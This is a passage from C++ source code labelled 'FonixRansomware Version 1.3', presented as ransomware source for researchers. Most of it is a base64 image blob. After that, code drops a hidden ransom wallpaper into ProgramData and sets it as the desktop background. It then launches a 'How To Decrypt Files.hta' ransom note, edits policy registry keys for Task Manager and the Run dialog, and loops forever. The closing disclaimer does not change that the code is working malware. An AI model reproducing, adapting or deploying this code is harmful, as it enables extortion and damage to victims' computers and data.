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";
    ofstream Rm("C:\\ProgramData\\XINOFBG.jpg", ios::out | ios::binary);
    Rm.write(decode(text1).c_str(), decode(text1).size());
    Rm.write(decode(text2).c_str(), decode(text2).size());
    Rm.close();
    int res = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)L"C:\\ProgramData\\XINOFBG.jpg", SPIF_UPDATEINIFILE);
    system("attrib +h +s C:\\ProgramData\\XINOFBG.jpg");
    system("\"How To Decrypt Files.hta\"");
    thread ht(hta);
    ht.detach();


    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System   /v DisableTaskMgr  /t REG_DWORD /d 0 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v NoRun  /t REG_DWORD /d 0 /f");

    while (1 == 1) {
        continue;
    }
}



/////  FonixRansomware Version 1.3  /////


/* Version 1.3
   This version is a Basic Source of FonixCrypter
   For Researchers , this malware changed a lot in
   its later versions and has fixes bugs in this code

NOTE : Please do not use this source code in malicious ways
*/